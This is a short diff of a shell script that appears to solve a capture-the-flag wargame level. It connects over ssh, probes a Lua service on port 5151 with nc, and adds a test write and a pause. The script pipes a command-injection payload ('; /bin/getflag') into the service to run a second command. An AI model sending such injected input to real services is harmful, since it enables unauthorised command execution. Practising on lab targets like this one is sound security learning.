@@ -12,6 +12,12 @@ ssh "cat level11.lua"
 
 ssh 'ps aux | grep lua'
 
+ssh 'printf "hello > /tmp/test\n" | nc 127.0.0.1 5151'
+
+ssh 'cat /tmp/test'
+
+read pause
+
 ssh 'printf "; /bin/getflag > /tmp/f11\n" | nc 127.0.0.1 5151'
 
 sleep 2
